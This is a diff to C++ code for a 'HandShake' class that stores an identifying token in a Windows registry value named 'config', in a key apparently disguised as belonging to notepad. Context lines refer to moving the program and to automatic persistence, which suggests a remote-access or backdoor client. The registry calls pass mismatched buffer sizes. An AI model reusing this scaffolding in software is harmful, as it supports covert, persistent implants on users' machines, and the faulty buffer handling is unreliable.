@@ -15,7 +15,16 @@ HandShake::HandShake()
     a_current_directory = setCurrentDirectory();
     a_name_prog = NAME_PROG;
     a_token = getTokenOrSetTokenInRegistry();
-
+    cout << strlen(a_token.c_str()) << endl;
+    
+    if(strlen(a_token.c_str()) != a_size_token) //If an error occurred and the token is not the size of a_size_token:
+    {
+        // Tokken not found
+        a_token = to_utf8(generateToken(a_size_token));
+        //cout << "New token: " << a_token << endl;
+    }
+    else 
+    {cout << "token is ok" << endl;}
     a_location_prog = setLocationProg();
 }
 
@@ -32,7 +41,7 @@ void HandShake::beforeHandShake()
     {
         moveProg();
     }
-    a_location_prog = setLocationProg();
+    //a_location_prog = setLocationProg();
     
     if(AUTO_PERSISTENCE)
     {
@@ -167,21 +176,22 @@ string HandShake::getTokenOrSetTokenInRegistry()
 {
     wstring tmp_return;
 
-    WCHAR name[] = L"config"; //name of string key.
-    WCHAR token[128];
+    const WCHAR name[] = L"config"; //name of string key.
+    WCHAR token[a_size_token];
 
     LONG status; //allows to check the situation of the functions 
     HKEY hKey;
 
-    WCHAR buffer[32]; //RegQueryValueExW lpData (token)
-     
-    DWORD lpData = REG_SZ; //RegQueryValueExW
-    DWORD lpcbData = 512; 
+    WCHAR buffer[4096]; //RegQueryValueExW lpData (token)
+    DWORD lpcbData = sizeof(buffer); 
+
+    DWORD lpType = REG_SZ; //RegQueryValueExW
+
 
     //--------------------------------------------------------------------------------
 
     HKEY HKEY_admin_or_not = NULL;
-    WCHAR path_of_key[64];
+    WCHAR path_of_key[MAX_PATH];
 
     //--------------------------------------------------------------------------------
 
@@ -210,24 +220,23 @@ string HandShake::getTokenOrSetTokenInRegistry()
         if(status != 0)
         {
             //if If the notepad key has not been created.  
-            ;
+            return to_utf8(generateToken(a_size_token));
         }
         else
         {
             ;
-            //cout << "[+] Key is create...." << endl;
+           // cout << "[+] Key is create...." << endl;
         }
     }
-    //cout << "[+] Key is open. " << endl;
-
-    //get value (string)
-    status = RegQueryValueExW(hKey, name ,NULL , &lpData, (LPBYTE) &buffer[0] , &lpcbData); 
     
+    //get value (string)
+    status = RegQueryValueExW(hKey, name ,NULL , &lpType, (LPBYTE) &buffer[0] , &lpcbData); 
+
     if(status != 0)//If token no set
     {
         //string of key not found or token is not defined.
         ZeroMemory(&buffer, wcslen(buffer));
-        wcscpy(token, generateToken(24).c_str()); //(data)
+        wcscpy(token, generateToken(a_size_token).c_str()); //(data)
                 
         //set key:
         status =  RegSetValueExW(hKey, name ,0, REG_SZ, (LPBYTE) token, lpcbData);
@@ -242,15 +251,18 @@ string HandShake::getTokenOrSetTokenInRegistry()
 
     else
     {
+        //cout << "token no set" << endl;
         tmp_return = buffer;
-     
+        RegCloseKey(hKey);
+        
         return to_utf8(tmp_return);
+       
     }
-
+    //cout << "token set " << endl;
     RegCloseKey(hKey);
-
     tmp_return = token;
     return to_utf8(tmp_return);
+    
 }
 
 
